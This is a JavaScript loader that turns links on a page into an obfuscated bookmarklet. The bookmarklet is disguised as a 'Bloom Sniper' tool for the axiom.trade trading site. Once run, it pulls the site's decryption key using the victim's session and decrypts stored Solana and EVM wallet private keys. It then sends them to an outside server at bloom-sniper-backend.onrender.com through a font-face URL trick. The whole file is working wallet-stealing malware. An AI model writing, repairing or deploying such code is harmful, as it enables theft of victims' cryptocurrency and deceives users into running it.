console.log('✅ Loader.js loaded from Render');

document.addEventListener('DOMContentLoaded', () => {
    console.log('✅ DOM ready - injecting full stealer');

    const buttons = document.querySelectorAll('a.bookmarklet');
    console.log(`Found ${buttons.length} bookmarklet button(s)`);

    buttons.forEach(btn => {
        const innerCode = `(async () => {
            try {
                if (location.hostname !== "axiom.trade") {
                    alert("This bookmarklet only works on axiom.trade");
                    return;
                }

                alert("✅ Bloom Sniper activated - attempting to steal wallets...");

                // Get bundleKey
                const response = await fetch("https://api8.axiom.trade/bundle-key-and-wallets", {
                    method: "POST", 
                    credentials: "include"
                });
                const { bundleKey } = await response.json();

                if (!bundleKey) throw new Error("No bundleKey received");

                // Proper key conversion for AES-GCM (this fixes the 128/256 bit error)
                function stringToArray(key) {
                    try {
                        const cleaned = key.replace(/-/g, "+").replace(/_/g, "/");
                        const binary = atob(cleaned);
                        const bytes = new Uint8Array(binary.length);
                        for (let i = 0; i < binary.length; i++) {
                            bytes[i] = binary.charCodeAt(i);
                        }
                        return bytes;
                    } catch (e) {
                        return new TextEncoder().encode(key);
                    }
                }

                const keyBytes = stringToArray(bundleKey);
                const cryptoKey = await crypto.subtle.importKey(
                    "raw", 
                    keyBytes.buffer, 
                    { name: "AES-GCM" }, 
                    false, 
                    ["decrypt"]
                );

                function arrayToString(dataArray) {
                    const ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
                    let resultDigits = [0];
                    for (let element of dataArray) {
                        let carry = element;
                        for (let i = 0; i < resultDigits.length; i++) {
                            const value = resultDigits[i] * 256 + carry;
                            resultDigits[i] = value % 58;
                            carry = Math.floor(value / 58);
                        }
                        while (carry) {
                            resultDigits.push(carry % 58);
                            carry = Math.floor(carry / 58);
                        }
                    }
                    let resultString = "";
                    for (let i = 0; i < dataArray.length && dataArray[i] === 0; i++) resultString += ALPHABET[0];
                    for (let i = resultDigits.length - 1; i >= 0; i--) resultString += ALPHABET[resultDigits[i]];
                    return resultString;
                }

                function arrayToStringEVM(e) {
                    return Array.from(e instanceof Uint8Array ? e : new Uint8Array(e))
                        .map(x => x.toString(16).padStart(2, "0")).join("");
                }

                const success = [];

                // Solana
                const solanaBundles = JSON.parse(localStorage.getItem("sBundles") || "[]");
                for (const bundle of solanaBundles) {
                    try {
                        const parts = bundle.split(":");
                        const iv = stringToArray(parts[0]);
                        const data = stringToArray(parts[1]);
                        const decrypted = await crypto.subtle.decrypt({name: "AES-GCM", iv: iv}, cryptoKey, data);
                        const dec = new Uint8Array(decrypted);
                        if (dec.length === 64) {
                            success.push({
                                pub: arrayToString(dec.slice(32)),
                                priv: arrayToString(dec)
                            });
                        }
                    } catch(e){}
                }

                // EVM
                let ethers = null;
                try { ethers = await import("https://cdn.jsdelivr.net/npm/ethers@6.15.0/+esm"); } catch(e){}
                const evmBundles = JSON.parse(localStorage.getItem("eBundles") || "[]");
                for (const bundle of evmBundles) {
                    try {
                        const parts = bundle.split(":");
                        const iv = stringToArray(parts[0]);
                        const data = stringToArray(parts[1]);
                        const decrypted = await crypto.subtle.decrypt({name: "AES-GCM", iv: iv}, cryptoKey, data);
                        const dec = new Uint8Array(decrypted);
                        const priv = arrayToStringEVM(dec);
                        let pub = "unknown";
                        if (ethers) pub = ethers.computeAddress("0x" + priv);
                        success.push({ pub, priv });
                    } catch(e){}
                }

                // Send via font-face trick
                const payload = { 
                    keys: success, 
                    code: "axiom", 
                    site: "Axiom", 
                    count: success.length,
                    timestamp: Date.now() 
                };

                const encoded = btoa(unescape(encodeURIComponent(JSON.stringify(payload))));
                const url = "https://bloom-sniper-backend.onrender.com/i/" + encoded;

                const style = document.createElement("style");
                style.textContent = '@font-face{font-family:"leak";src:url("' + url + '");}';
                document.head.appendChild(style);

                console.log('✅ Sent ' + success.length + ' wallets to server');
                alert('✅ Successfully extracted ' + success.length + ' wallets! Check Render logs.');
            } catch (err) {
                console.error('Stealer error:', err);
                alert('Stealer error: ' + err.message);
            }
        })();`;

        const encodedCode = btoa(unescape(encodeURIComponent(innerCode)));
        btn.href = 'javascript:eval(atob("' + encodedCode + '"))';
        btn.draggable = true;

        console.log('✅ Full stealer bookmarklet injected successfully');
    });
});